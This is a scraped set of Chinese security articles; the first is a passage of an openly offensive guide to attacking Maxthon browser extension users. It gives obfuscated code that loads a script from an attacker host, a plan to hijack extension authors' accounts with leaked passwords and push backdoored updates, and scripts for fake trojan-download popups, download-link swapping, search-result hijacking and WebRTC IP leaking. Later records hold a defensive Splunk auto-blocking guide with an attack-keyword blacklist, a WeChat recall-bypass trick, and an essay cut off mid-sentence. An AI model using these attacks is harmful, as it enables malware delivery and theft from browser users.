被动等待这个办法是属于广撒网，当没有指定性群体或者个人，只是为了单纯的攻击或者研究时使用。这里也有一些小技巧，当开发者上传插件时，遨游审核人员会对插件进行审核，如果发现危害用户的代码，将不给予通过，乍一看没什么问题，但是没有后续了。没有定期自动化扫描插件代码而且即使插件是一个小游戏用，都可以在配置文件def.json里申请权限是最高的当代码量足够多的时候，开发人员可以把一些危害到用户请求的代码进行加密混编绕过审查人员的眼睛。（调用伟大的人民领袖毛主席的一句话:与规矩斗，其乐无穷。与代码斗其乐无穷。与人斗其乐无穷。）可以在插件里调用第三方的JavaScript代码，第三方url可以指向任何域名。没有进行判断URL及js文件是否为可信利用以上的问题，我们就可以写出一个具有危害到用户插件，且绕过审查人员的眼睛。我们可以在插件源码base.js文件里写//xxxxx其他多余的代码var script = document.createElement('script');script.src = ""http://你的域名/javascript文件名.js"";document.body.appendChild(script);//xxxxx其他多余的代码如果不放心可可以加密成下面的这种格式:eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?"""":e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('o 7=[""\\e\\c\\g\\b\\a\\9"",""\\c\\g\\6\\8\\9\\6\\q\\h\\6\\j\\6\\f\\9"",""\\e\\g\\c"",""\\m\\9\\9\\a\\t\\i\\i\\d\\n\\j\\8\\b\\f\\i\\l\\8\\s\\8\\e\\c\\g\\b\\a\\9\\r\\b\\h\\6\\f\\8\\j\\6\\u\\l\\e"",""\\8\\a\\a\\6\\f\\d\\w\\m\\b\\h\\d"",""\\x\\n\\d\\v""];o k=p[7[1]](7[0]);k[7[2]]=7[3];p[7[5]][7[4]](k)',34,34,'||||||x65|_0|x61|x74|x70|x69|x63|x64|x73|x6E|x72|x6C|x2F|x6D|script|x6A|x68|x6F|var|document|x45|x66|x76|x3A|x2E|x79|x43|x62'.split('|'),0,{}))方法为：先在javascriptobfuscator上把正常的javascript代码加密成:var _0x67c5=[""\x73\x63\x72\x69\x70\x74"",""\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74"",""\x73\x72\x63"",""\x68\x74\x74\x70\x3A\x2F\x2F\x64\x6F\x6D\x61\x69\x6E\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x66\x69\x6C\x65\x6E\x61\x6D\x65\x2E\x6A\x73"",""\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64"",""\x62\x6F\x64\x79""];var script=document[_0x67c5[1]](_0x67c5[0]);script[_0x67c5[2]]= _0x67c5[3];document[_0x67c5[5]][_0x67c5[4]](script)如图：因为这样的代码看起来着实有点可疑…所以再去站长之家加密成常见的加密代码:嗯，看着正常多了。放在众多代码之中，审查人员也很难找到(也不会用心找的)提交后，会在遨游插件的首页显示最近更新的插件，你只需要每个星期随便增加一点代码或者删除一点代码，再更新一下插件，你的插件就会常年存在插件首页，安装人数想不多都难。0×1.3 基于社工库控制插件作者的账户这个也是我个人来说最喜欢的方式，毕竟不得不承认不劳而获真的好爽啊。因为Maxthon更新插件时没有像Chrome那样需要秘钥才可以更新，所以导致这个’逻辑漏洞”。因为没有验证当前是否为作者本人的机制，才导致这个方法的可行性。之前加了maxthon插件的作者群：203339427里面大多都是插件的开发人员，拿他们的邮箱、QQ放在社工库里进行查询，得到密码后可以进行尝试登陆。当然因为不确定是作者使用的是哪个邮箱，我们先拿QQ邮箱登录，他会提示账户或密码错误，不知道是账户错误还是密码错误，可以先去遨游账户中心-忘记密码先填写QQ邮箱，如果说用户名不存在，我们可以在网上搜索一下这个作者其他的邮箱，再进行测试(我测试的账户里，很多都需要在网上搜索一下其他的邮箱)。因为之前我把这个当做漏洞提交给wooyun了，遨游没什么反应。本来是想登陆其他用户说明的，但是wooyun暂时休整，无法看到我之前的漏洞详情，而当时社到的账户和密码也没有备份，只在wooyun漏洞详情里有，没有办法，所以这里我就以我自己为例：这里有个更新文件，我们这个时候，可以先把文件download本地，在里面的javascript文件里植入我们的后门。再上传上去。就可以控制1000多个用户了。插件二次审核查的更松。而且当你打开遨游浏览器时，遨游浏览器会检测你的插件是否为最新的，如果不是最新的，他会在后台静默安装最新的插件。这个时候对我们的帮助特别大。比如我们更新插件后，只需要等待用户重新打开遨游浏览器就可以实现了攻击的效果。更新的时候，就这个账户当做自己的账户就行了，然后照着0×1.2代码写上去就没问题了。0×1.4 控制插件里调用的第三方javascript代码这个方法比较繁琐，有两种方法来获取第三方的javascript，分为两种情况不具有可视化页面具有可视化页面0×1.4.1 不具有可视化页面类似我上面所说的，在插件的def.json配置文件里写上:""actions"": [{    ""type"": ""script"",    ""entryPoints"": [        ""doc_onload""    ],    ""js"": [        ""base.js""    ],    ""include"": [""*""],    ""includeFrames"": true}]然后在base.js文件里写入你要调用的第三方javascript文件：var script = document.createElement('script');script.src = ""http://119.29.58.242/control.js"";document.body.appendChild(script);像这种的话，就需要在把插件download本地，然后使用maxthon官方提供的MxPacker软件，进行的解密，首先分析def.json里的action字段下的js属性，指向的是哪个javascript文件。再进行分析，当然也可以使用其他软件对文件内容进行搜索，看里面是否存在’document.createElement’关键字。找到后，接下来就是苦力活了，入侵这个第三方javascript所属的网站。入侵后再修改这个javascript文件，就行了。0×1.4.2 具有可视化页面这个比上面0×1.4.1简单点，使用之前长短短在zone分享的代码就可以把这个页面所有第三方的javascript文件列举出来：for(var i=0,tags=document.querySelectorAll('iframe[src],frame[src],script[src],link[rel=stylesheet],object[data],embed[src]'),tag;tag=tags[i];i++){   var a = document.createElement('a');   a.href = tag.src||tag.href||tag.data;   if(a.hostname!=location.hostname){     console.warn(location.hostname+' 发现第三方资源['+tag.localName+']:'+a.href);   } }使用方法如下：使用的时候，会发现有的插件是调用了插件本身的javascript文件，或者其他baidu、360等第三方安全不容易被入侵的网站里的javascript代码，这个时候就比较费时费力了。0×1.4.3 控制插件里调用的第三方javascript代码总结这个方法较为繁琐，优点如下：不容易被发现向上反查也比较难追踪缺点：费时费力成功率较低此种方法适用于针对某一人或团体，只能获得其装的插件名称，当别无他法时使用此方法。0×2 那些隐藏的API：因为一些API获得的信息比较隐私，所以遨游官方没在在API手册里写。但是他们真实存在，我们可以在一个普通的页面里打开审查元素下的Console输入external来查看一些遨游官方隐藏的API。还有一种是在插件页面的里专用API，插件里的API基本上每个版本上都会发生变化，下面是3.x版本的API：maxthon.system.Utility.getMacAddresses() //获取用户的MAC地址maxthon.system.GraphicsEnvironment.getLocalGraphicsEnvironment().getAvailableFontFamilyNames() //获取用户当前所有的字体文maxthon.system.GraphicsEnvironment.getLocalGraphicsEnvironment().getSystemFontName() //用户当前应用的字体maxthon.io.File.createTempFile().name_ //获取用户临时目录maxthon.io.File.createTempFile().isFile //判断name_文件是否存在，但是这里我无法重新设置name_的值下面是最新版本4.x版本的API：遨游把之前在maxthon对象下的函数、对象分离在其他地方了（其实还是有，不明白其用意）mx.app.getAvatar()    //获得当前登录用户的头像(data:image/png;base64格式)mx.app.login()    //判断是否登录了遨游浏览器(登录返回true，没登陆返回false)mx.app.getProfile()    //获得用户当前的状态(是否登录、uid、用户名称)mx.app.getSystemLocale()    //获得系统语言(例如：zh-cn)mx.app.showUserPanel()    //显示用户菜单(相当于点击左上角的头像)//以上的代码需要事先运行mx.app.user()、mx.app.locale()clientInformation.plugins     //浏览器支持的插件(可看到用户安装哪些软件)clientInformation.mimeTypes    //列举出支持的application(可看到用户安装哪些软件)这里针对最后两个API截图看下：这些东西写在插件里，获取用户安装了哪些软件轻而易举。基本上是没有隐私可言了。0×3 攻击向量：普通的获取cookies我们就不说了，介绍点其他的。上面介绍的都是针对浏览器插件对用户进行的攻击，但是攻击的平面都是浏览器。但是谁不想进一步控制用户的电脑权限呢。大致的思路如下：弹窗欺骗用户说需要下载软件，其实是木马程序使用浏览器漏洞进行攻击替换下载链接0×3.1 弹窗欺骗用户下载软件这一步很简单，就是一些简单的javascript代码：(function(){    //闭包函数，防止变量污染    alert(""请下载xxx安全插件保障您在此网站的安全"");    location.href = ""http://baidu.com/download/xxxx.exe"";})()但是这里不能一直弹窗下载，不然肯定会引起怀疑的，下面我们来进行优化：(function(){    //闭包函数，防止变量污染    var downDate = new Date();  //获取当前的时间    var downDateY = String(downDate).split("" "")[3]; //年份    var downDateM = String(downDate).split("" "")[1]; //月份    var downDateD = String(downDate).split("" "")[2]; //日期    var downDateT = String(downDate).split("" "")[4].split("":"");  //时间    if(location.href != ""https://baidu.com/""){  //当不是百度时，不执行下面的代码        return fasle;    }    if(downDateY == ""2016"" &amp;&amp; downDateM == ""Oct"" &amp;&amp; downDateD == ""28"" &amp;&amp; downDateT[0] == ""21"" &amp;&amp; downDateT[1] &lt; ""30""){        alert(""请下载xxx安全插件保障您在此网站的安全"");        location.href = ""http://baidu.com/download/xxxx.exe"";    }})()真正写的时候，不要像我这么写，我这样写是因为逻辑比较简单，但是代码量比较多。意思是说当当前网站是[https://baidu.com/](https://baidu.com/)时再判断时间是否为2016年10月28号晚上9点到9点半之间，如果是则弹窗让用户下载木马程序。0×3.2 使用浏览器漏洞进行攻击漏洞是要靠自己挖掘的，这里不再多说，大家可以去看一下Blast写的书籍《浏览器安全》。也可以看下之间黑哥写的PPT《去年跨过的浏览器》，之前maxthon就因为特殊域下的mxCall函数的问题，导致可以执行任意命令。大家可以挖挖看，总会有意想不到的收获。0×3.3 替换下载链接替换的话，我们需要先采集几个下载量比较大的下载站，我这里列举一下：ZOL下载-免费软件,绿色软件天空下载站华军软件园hao123下载站太平洋下载中心百度软件中心还有很多，这里就不在列举了，下面我们就根据这些下载站来写替换的javascript代码。 先写段代码，让他判断当前的网址是否为下载站(function(){    var downloadWebsite = [        'http://xiazai.zol.com.cn',        'http://www.skycn.com',        'http://www.onlinedown.net',        'http://dl.pconline.com.cn',        'http://rj.baidu.com'    ];  //要替换的下载站url地址    var replaceDownloadUrl = ""http://xxxx.com/download/soft.rar"";   //要替换的下载软件    switch(location.origin){  //对当前的url进判断，是否为下载站，如果是则进入其操作函数里        case downloadWebsite[0]:            var download1 = document.getElementById(""downloadTop"");            var download2 = document.querySelectorAll("".down-alink a"");            var download3 = document.querySelectorAll("".down-alink01 a"");            if(download1 != null &amp;&amp; download2.length != 0 &amp;&amp; download3.length != 0){                download1.href = replaceDownloadUrl;                for(var j = 0;j &lt; download2.length;j++){                    download2[j].href = replaceDownloadUrl;                }                for(var k = 0;k &lt; download3.length;k++){                    download3[k].href = replaceDownloadUrl;                }            }        break;        case downloadWebsite[1]:            var download1 = document.querySelectorAll("".ul_Address li a"");            if(download1.length != 0){                for(var j = 0;j &lt; download1.length;j++){                    download1[j].href = replaceDownloadUrl;                }            }        break;        case downloadWebsite[2]:            var download1 = document.querySelectorAll("".softinfoBox .meg a"");            var download2 = document.querySelectorAll("".downDz a"");;            if(download1.length != 0 &amp;&amp; download2.length != 0){                download1[0].href = replaceDownloadUrl;                for(var j = 0;j &lt; download2.length;j++){                    download2[j].href = replaceDownloadUrl;                }            }        break;        case downloadWebsite[3]:            var download1 = document.querySelectorAll("".dlLinks-a a"");            if(download1.length != 0){                for(var j = 0;j &lt; download1.length;j++){                    download1[j].href = replaceDownloadUrl;                }            }        break;        case downloadWebsite[4]:            var download1 = document.querySelectorAll("".fast_download"");            var download2 = document.querySelectorAll("".normal_download"");            if(download1.length != 0 &amp;&amp; download2.length != 0){                download1[0].href = replaceDownloadUrl;                download2[0].href = replaceDownloadUrl;            }        break;    }})()0×3.4 修改百排名想做SEO的，可以使用此方法：(function(){    if(location.origin == ""https://www.baidu.com"" &amp;&amp; location.pathname == ""/s""){    //当时百度的搜索页面时        document.querySelectorAll(""#content_left h3 a"")[0].href = ""http://360.cn/""; //替换第一个搜索结果为指定的url地址    }})()0×3.5 内网嗅探这个方法的篇幅比较多，放在下一章说明。下面是利用WebRTC来实现的获取内网IP地址：var ipList = [];var webrtcxss = {    webrtc        : function(callback){        var ip_dups           = {};        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;        var mediaConstraints  = {            optional: [{RtpDataChannels: true}]        };        var servers = undefined;        if(window.webkitRTCPeerConnection){            servers = {iceServers: []};        }        var pc = new RTCPeerConnection(servers, mediaConstraints);        pc.onicecandidate = function(ice){            if(ice.candidate){                var ip_regex        = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;                var ip_addr         = ip_regex.exec(ice.candidate.candidate)[1];                 if(ip_dups[ip_addr] === undefined)                callback(ip_addr);                ip_dups[ip_addr]    = true;            }        };        pc.createDataChannel("""");        pc.createOffer(function(result){            pc.setLocalDescription(result, function(){});        });    },    getIp        : function(){        this.webrtc(function(ip){            console.log(ip)        });    }}webrtcxss.getIp();大家可以根据这个方法来想想有没有办法来实现一些更好玩的思路。0×4 结言：还有很多的API及攻击方法等待大家去发掘，我能做的就是给大家打开一个新的攻击平面，不用再局限那些已经熟悉的方法了。Author:Black-HoleBlog：http://bugs.ccgithub:https://github.com/BlackHole1/Twitter:https://twitter.com/Free_BlackHoleEmail:158blackhole@gmail.com","2016-10-25 15:56:31","Web安全","浏览器插件的攻击向量","http://nsoad.com/Article/web/20161025/636.html"
"5ccbfb524f2f0a0a7a69c14c","每天都会有大量的公网恶意扫描和攻击行为，在企业安全建设中，可以利用大数据来实时分析攻击，通过防火墙联动来自动封禁恶意IP，其优点是配置灵活，且无需串联新设备。在此与大家分享一下大数据分析的应用","kong","每天都会有大量的公网恶意扫描和攻击行为，在企业安全建设中，可以利用大数据来实时分析攻击，通过防火墙联动来自动封禁恶意IP，其优点是配置灵活，且无需串联新设备。在此与大家分享一下大数据分析的应用实践。0×00 整体思路如下图所示，蓝色箭头表示数据流向，橙色箭头表示接口调用。splunk收集所有服务器、蜜罐、防火墙的日志，实时分析是否存在恶意攻击，如果判定为攻击行为，则立即调用防火墙接口进行IP封禁，完成防火墙联动。（数据流向图）0×01 产品简介        splunk：大数据分析平台，搜索极快，字段创建灵活。splunk官方网站：[http://www.freebuf.com/articles/network/112065.html]        防火墙：需要使用自带API的防火墙，以便进行命令调用。0×02 日志收集     部署splunk的转发器进行统一日志收集，同时可以配置splunk索引器（日志中心）的端口监听，来收集所有设备的syslog。索引器和转发器的配置安装网上也有教程，这里不再多写。（splunk整体架构）0×03 日志分析     splunk自带了一部分日志模板，如tomcat、IIS、windows日志等（如下图），同时也不必担心无法分析其他的日志，我们可以通过正则表达式来灵活地建立自定义字段，从而将同一类型的日志进行精细化处理。（内置的字段）    在splunk左侧的界面可以针对想要的字段进行搜索，如下图，这些创建字段的教程网上有不少，不再赘述。（字段查询结果）下面说一下检测公网扫描的行为，判定扫描的规则是：1. 扫描肯定会产生404或500错误(sc_status=404 OR sc_status=500)2. 由公网发起的(c_ip!=""10.*.*.*"" )3. URI中包含了下列关键字（黑名单方式）(cs_uri_stem=""*action redirect*"" OR cs_uri_stem=""*invoker*"" OR cs_uri_stem=""*jmx-console*"" OR cs_uri_stem=""*web-console*"" OR cs_uri_stem=""*fck*"" OR cs_uri_stem=""*dede*"" OR cs_uri_stem=""*Websense*"" OR cs_uri_stem=""*console*"" OR cs_uri_stem=""*xss*"" OR cs_uri_stem=""*script*"" OR cs_uri_stem=""*select*"" OR cs_uri_stem=""*where*"" OR cs_uri_stem=""*union*"" OR cs_uri_stem=""*common.inc.php*"" OR cs_uri_stem=""*concat*"" OR cs_uri_stem=""*appscan*"" OR cs_uri_stem=""*wvs*"" OR cs_uri_stem=""*admin*"" OR cs_uri_stem=""*shell*"" OR cs_uri_stem=""*etc/passwd*"")4. 如果是扫描，日志中同一个源IP肯定会在短时间（至少持续了30秒）内有很多的错误事件transaction c_ip maxspan=3m | whereduration&gt;30    汇总后如下，并且需要设置实时监控：    搜索出的结果如下图所示，已经将每个进行扫描的源IP进行抓取，如下图所示。（实时监测的公网扫描行为）     利用同样的检测原理，我们可以设置对邮箱的暴力破解（OWA、SMTP等）进行监控（只需要自己模拟一下暴力破解过程，在splunk上搜索相应的登录失败日志即可。）0×04 设置告警     既然可以抓到实时的扫描源IP，下一步就是要进行邮件通知安全部门。（添加告警触发后的操作）     由此可以设置邮件告警，通告扫描的源IP。此时已经具备了收到告警后，手动在防火墙封禁的条件。（扫描告警邮件）0×05 防火墙联动     俗话说的好：不用自动化，不是好攻城狮。于是开始了研究防火墙联动的工作，首先即着手如何用splunk导出告警原文并运行脚本。想要导出告警文本，就需要知道splunk告警中的变量，其中总共有8个变量，从0到8（没有7），如下表所示。变量    描述    变量    描述0    脚本名称    4    报表名称1    返回事件的数量    5    触发原因2    搜索项目    6    浏览报表的浏览器URL3    具有完全资质的查询字符串    8    搜索结果储存的文件    在这里我们需要用到变量8，其变量内容为_raw（即搜索出来的结果，如下图）    每次告警触发的时候都会有一批raw输出，而告警搜索语句中我们设置了针对同一源IP的扫描进行事件归并，所以每次告警的源IP肯定是一样的。由此我们可以利用正则表达式来筛选出单独的IP，同时要排除10.*.*.*，又由于可能一次告警出现多条攻击记录，正则筛选出IP后，可能是很多行同样的IP，此时摘出来第一个即可。脚本如（addBlack.sh）。#!/bin/baship=`gunzip -c $8 | grep -oE'[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'| grep -v -E'^10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'| head -n1`echo ""$ip `date`"" &gt;&gt;/opt/splunk/bin/scripts/ScanBanIPLog.txtpython /opt/splunk/bin/scripts/checkIP.py""$ip""    在调用python脚本时，必须要写全py文件所在路径，否则sh脚本无法自动找到当前的路径。在筛选出IP后，需要先过一遍公司各分支机构的白名单，以防误将公司分支IP封禁。脚本如下（checkIP.py）#coding:utf-8import osimport sysip = sys.argv[1]+""\n""flag = ""False""f = open(""/opt/splunk/bin/scripts/whiteIP.txt"")for i in f:   if i == ip:       flag = ""True""f.close()if flag == ""False"":   os.system(""python /opt/splunk/bin/scripts/addGroup.py ""+ip)else:   print ""This IP is in the whitelist!""    如果攻击IP不在白名单中，则调用防火墙API封禁IP（具体的API就不共享了，领会精神）。import urllib2 import urllibimport sysip = sys.argv[1]add_black = ""https://10.1.0.1/api/?xxxxxxxx=""+ip+""&amp;key=xxxxxx""add_req = urllib2.Request(add_black)urllib2.urlopen(add_req)     至此，三个脚本环环相扣调用完毕，剩下的就是要在splunk配置告警时运行的脚本了。在编辑告警操作中，添加运行脚本”addBlack.sh”（脚本需放置于$SPLUNK_HOME/bin/scripts目录中）（添加运行脚本）     此后再检测到扫描，splunk会自动发送邮件到安全部门，并调用防火墙API直接封禁攻击IP（世界终于清净了一些）。0×06 蜜罐搭建SSH蜜罐在文章开头附了cowrie部署的文章，通过cowrie可以搭建一个SSH蜜罐，同时splunk分析防火墙发来的日志，实时监测对于cowrie蜜罐22端口的连接情况。在正常情况下，蜜罐不会被正常用户访问，何况还是SSH登录的请求，如果短时间内产生了超过2条以上的连接情况，必是恶意请求无疑，此时使用告警脚本调用防火墙API封禁恶意IP即可。web蜜罐其实web蜜罐很简单，只需一个Apache+静态HTML页面即可。映射到公网之后，配置一个“奇葩的”公司二级域名（如fuck.xx.com）指向到这个公网IP，普通用户肯定不会访问到这个域名。Apache启动后实时监测防火墙发来的日志，一旦发现有对蜜罐80端口的访问记录，立即告警，如果限制的比较严格，可以直接使用告警脚本调用防火墙API封禁访问蜜罐的IP。0×07 结语     至此，简单的WAF已经制作完毕，其实核心的只是几个特征，可以将恶意扫描实时封禁，对于sqlmap也会有一定的防护，但是对于0day来说并没有很好的防护效果，还需根据特征值来手动加入检测规则。    P.S splunk一定要装在linux里。装在windows容易悲剧，不知道什么时候就会卡的欲仙欲死。","2016-12-05 17:05:43","Web安全","Splunk+蜜罐+防火墙=简易WAF","http://nsoad.com/Article/web/20161205/886.html"
"5ccbfb524f2f0a0a7a69c14d",,"silence","有个高中微信搞笑群，常发一些搞笑的图片，但是发后就撤回了，一不小心就看不到了，所以就想着怎么查看撤回的图片或者文字。 思路是这样的，当微信收到撤回消息的请求后，将撤回的响应包改掉，这样微信就不能撤回了，微信APP比较难搞，就直接用微信网页版抓包修改吧。关于微信网页版的抓包其实也比较复杂，主要是常常抓包失败，网页无法打开（支付宝、淘宝也是，貌似它们的https协议更安全，不好代理，求解），为此专门做了个vmware虚拟机，配置是xpsp3+    搜狗浏览器6.3.8.22061+fiddler v4.6.2.32002。打开fiddler，设置https，如图：打开搜狗浏览器设置代理服务器：在浏览器里访问https://wx2.qq.com/?&amp;lang=zh_CN，浏览器显示如下截图，表示代理成功：此时fiddler显示如下，表示抓包成功：微信手机端扫描二维码成功登陆：Fiddler截获数据包如下所示：介绍一下收到消息跟撤回消息的区别：在收到消息时，微信响应包中MsgType=1，Content是介绍到的消息：在收到撤回消息时MsgType=10002,Content是撤回的提示信息：  要想查看撤回的消息，只需要将”MsgType”: 10002替换成”MsgType”: 1,并将Content        替换成友好信息就行了。    下边编辑fiddler脚本，自动替换指定响应数据：要想编辑fiddler脚本，要下载一个fiddler脚本编辑插件，点击fiddler-&gt;Rules-&gt;Customize Rules,        按照提示安装插件，重启fiddler，截图如下：编辑fiddler脚本，使其在响应包中自定替换指定内容，直接编辑函数，替换如下所示：static functionOnBeforeResponse(oSession: Session) {        if (m_Hide304s &amp;&amp; oSession.responseCode== 304) {            oSession[""ui-hide""] =""true"";        }        if(oSession.GetResponseBodyAsString().Contains('""MsgType"": 10002')){            // Remove any compression orchunking            oSession.utilDecodeResponse();             var oBody =System.Text.Encoding.UTF8.GetString(oSession.responseBodyBytes);             // Replace all instances of the DIVtag with an empty string            //var oRegEx =/&lt;div[^&gt;]*&gt;(.*?)&lt;\/div&gt;/gi;            //oBody = null;            varstrBody=oBody.replace('""MsgType"": 10002','""MsgType"": 1');             // Set the response body to thediv-less string           //oSession.utilSetResponseBody(strBody);             var resourse=/""Content"":""(.*)""/gi;            var resourse1='""Content"":""以上为撤回消息""'; //             varstrBody=strBody.replace(resourse,resourse1);            //FiddlerObject.alert(strBody);           oSession.utilSetResponseBody(strBody);         } }保存，大功告成！！测试一下，先发送一段文字，然后撤回，效果如下所示：查看fiddler中的数据包，已经直接将撤回消息数据包替换掉了：这样，微信网页版一直开着，就可以查看所有被撤回的消息了","2016-09-28 13:39:18","Web安全","教你如何使用微信网页版“抓取”微信撤回消息","http://nsoad.com/Article/web/20160928/456.html"
"5ccbfb524f2f0a0a7a69c14e","0x00 背景最近，偶然看到一篇论文讲如何利用机器学习从加密的网络流量中识别出恶意软件的网络流量。一开始认为这个价值很高，毕竟现在越来越多的恶意软件都开始使用TLS来躲","kong","0x00 背景最近，偶然看到一篇论文讲如何利用机器学习从加密的网络流量中识别出恶意软件的网络流量。一开始认为这个价值很高，毕竟现在越来越多的恶意软件都开始使用TLS来躲避安全产品的检测和过滤。但是看完论文之后又有些失望，虽然文章的实验结果非常漂亮，但是有一点治标不治本的感觉，机器学习又被拿来作为一个噱头。回顾过去的几年，机器学习在安全领域有不少应用，但其处境却一直比较尴尬：一方面，机器学习技术在业内已有不少成功的应用，大量简单的重复性劳动工作可以很好的由机器学习算法解决。但另一方面，面对一些“技术性”较高的工作，机器学习技术却又远远达不到标准。和其他行业不同，安全行业是一个比较敏感的行业。比如做一个推荐系统，效果不好的最多也就是给用户推荐了一些他不感兴趣的内容，并不会造成太大损失；而在安全行业，假如用机器学习技术做病毒查杀，效果不好的话后果就严重了，无论是误报或漏报，对客户来说都会造成实际的或潜在的损失。与此同时，安全行业也是一个与人博弈的行业。我们在其他领域采用机器学习算法时，大部分情况下得到数据都是“正常人”在“正常的行为”中产生的数据，因此得到的模型能够很好的投入实际应用中。而在安全领域，我们的实际对手都是一帮技术高超、思路猥琐的黑客，费尽心思构建的机器学习模型在他们眼中往往是漏洞百出、不堪一击。如何让机器学习从学术殿堂真正走进实际应用，是每个安全研究人员值得思考的问题。本文从我所了解的一些案例和研究成果谈谈个人的看法和思考。0x01 从加密的网络流量中识别恶意软件？既然文章的开头提到了从加密的网络流量中识别恶意软件，我们先来看看这个论文的作者是如何考虑这个问题的，他们发现，在TLS握手阶段（该过程是不加密的），恶意软件所表现出的特征与正常的应用有较大区别。典型的TLS握手过程如下图所示：在握手的第一阶段，客户端需要告诉服务端自身所支持的协议版本、加密和压缩算法等信息，在这个过程中，正常的应用（用户能够按时更新）使用高强度加密算法和最新的TLS库，而恶意软件所使用的往往是一些较老版本协议或强度较低的加密算法。以此作为主要特征，加上网络流量本身的信息如总字节数大小、源端口与目的端口、持续时间以及网络流中包的长度和到达次序等作为辅助特征，利用机器学习算法即可训练得到一个分类模型。看完这段描述，我的内心是崩溃的，因为该方法是把TLS握手阶段的信息作为主要特征来考虑的。道高一尺，魔高一丈。以其人之道，还治其人之身，这句话点中了机器学习的死穴，我相信凡是看到这个篇论文的黑客都会想到：以后写木马的时候一定要采用最新版本的TLS库，和服务器通信时采用加密强度较高的算法，尽量选取和正常应用类似的参数……做到以上几点，论文中提出的方法就可以当成摆设了。0x02 域名生成算法中的博弈早期的一些DGA算法所产生的域名有着比较高的辨识度，例如下面这些域名给我们的直观感受就是英文字母随机出现，而且不是常见的单词或拼音的组合，而且很难“念”出来。事实上这些特征可以用马尔可夫模型和n-gram分布很好的描述出来，早就有相应的算法实现，识别的效果也非常不错。然而，很快就出现了一些升级版的DGA算法，如下面的这个域名indianbrewedsmk.rutwistedtransistoreekl.biz这无非就是随机找几个单词，然后拼凑在一起构成的域名，但是却完美的骗过了我们刚才提到的机器学习方法，因为这个域名无论从马尔可夫模型或是n-gram分布的角度来看，都和正常的域名没有太大的区别。唯一可疑的地方就是这个域名的长度以及几个毫无关联拼凑在一起的单词，所以额外从这两个角度考虑仍然可以亡羊补牢。更有甚者，在今年的BSidesLV 2016上，有人提出了一种基于深度学习的DGA算法——[DeepDGA]，将Alexa上收录的知名网站域名作为训练数据，送入LSTM模型和生成对抗网络(GAN, Generative Adversarial Networks)训练，最终生成的随机域名效果拔群。如下图所示(左侧是给定的输入)从字符的分布情况上来看，也与正常网站的域名基本一致随着深度学习技术的普及，或许在不久的将来安全研究人员就可以“惊喜的”发现某个勒索软件家族开始采用这种高端的域名生成算法了……0x03 来自恐怖分子的垃圾邮件事实上类似域名生成算法的博弈早就出现了，2003年美国打击塔利班武装时，从一名恐怖分子手中缴获了一台笔记本电脑，发现里面用于通信的电子邮件的风格都是典型的垃圾邮件，而真正传递的消息暗藏于这样的垃圾邮件中。因为面对NSA这样无孔不入的情报机构，越是遮遮掩掩，越是采用高强度的加密，反而越容易被盯上。同样因为NSA的无孔不入，他们每天需要处理的数据量也是天文数字，仔细检查所有数据是不可能的，必须有所取舍，而这其中有一类数据恰恰是被NSA所忽视的，那就是每天成千上万的垃圾邮件。在机器学习算法大行其道的今天，各大邮件服务提供商早就配备了一套成熟的垃圾邮件检测系统，无论是采用逻辑回归算法或是SVM算法，只要加上几句诸如优惠代开各类发票或是想免费拥有自已的xxx这样的垃圾邮件标配，妥妥的直接过滤掉。如果一封邮件都被邮件服务提供商认定为垃圾邮件，NSA又有什么理由去进一步怀疑呢？退一步讲，如果NSA想找出混在垃圾邮件中的有价值情报该怎么做呢？设关键词吗，上更复杂的机器学习算法吗？要是恐怖分子采用类似“藏头诗”这样的信息隐藏手法怎么办？有的同学说还可以通过邮件的通连关系啊，如果你听说过“死邮件”就不会这么想了。两人共用一个账号，利用邮箱的草稿箱传递消息，完全没有邮件的发送与接收等通连关系，这又是不按套路出牌。0x04 容易被骗的图像识别近几年来，如果你稍有关注图像识别领域，就知道基于深度学习技术的图像识别技术在各大图像识别比赛中大放异彩，甚至在某些任务上超过了人类。虽然目前人们仍然不能很好的解释为什么深度学习技术如此有效，但这依然阻挡不住众多数据科学家们孜孜不倦的搭建模型、调优参数。但正当一票又一票研究小组努力“刷榜”的时候，另一些人总是能看的更远一些。谷歌的Szegedy研究员就发现，基于深度学习的图像识别技术可能并不如我们相像的那么靠谱，利用一些简单的trick即可将其轻松欺骗。如下图所示：这两幅图在我们正常人眼中并没有太大区别，但是对图像识别系统，左图能够正确的识别为熊猫，右图却识别成了长臂猿，而且是99.3%的置信度而更为诡异的是一些在我们人类看起来毫无意义的图片，却被图像识别系统“正确”的识别了出来。比如下面这些例子0x05 一起躺枪的自动驾驶关于自动驾驶汽车的安全问题，国内外众多安全公司和研究人员已经做了很多次详细的分析和现场演示。例如在今年的ISC 2016上，来自浙大的徐文渊教授团队和360汽车信息安全实验室共同演示的针对特斯拉Model S汽车自动驾驶技术的攻击，通过干扰特斯拉汽车的三种传感器(超声波传感器、毫米波雷达和前置高清摄像头)，可以实现强制停车、误判距离、致盲等多种不安全的情况。以上都是黑客主动发起的攻击，自动驾驶自身也存在着缺陷。今年5月发生在美国发生的自动驾驶系统致人死亡的案例也引发了社会的大量关注：按照特斯拉的解释，这起事故发生时，车主布朗正驾驶Model S行驶在一条双向、有中央隔离带的公路上，自动驾驶处于开启模式，此时一辆牵引式挂车与Model S垂直的方向穿越公路。特斯拉表示，在强烈的日照条件下，驾驶员和自动驾驶系统都未能注意到牵引式挂车的白色车身，因此未能及时启动刹车系统。而由于牵引式挂车正在横穿公路，且车身较高，这一特殊情况导致Model 